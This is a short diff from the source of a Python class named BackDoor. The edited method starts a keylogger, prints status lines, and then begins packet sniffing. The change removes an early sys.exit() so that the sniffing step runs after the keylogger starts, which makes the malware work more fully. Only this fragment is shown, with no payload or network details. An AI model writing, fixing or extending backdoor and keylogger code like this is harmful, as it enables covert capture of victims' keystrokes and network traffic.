@@ -139,11 +139,10 @@ class BackDoor:
         try:
             self.start_keylogger()
         except KeyboardInterrupt as e:
-            sys.exit("Closed")
+            sys.exit(" Closed")
         print("Keylogger started")
         print("Listening for packets")
         print("--------------------------------------------------------------")
-        sys.exit()
         self.sniff_init()
 
     def start_keylogger(self):
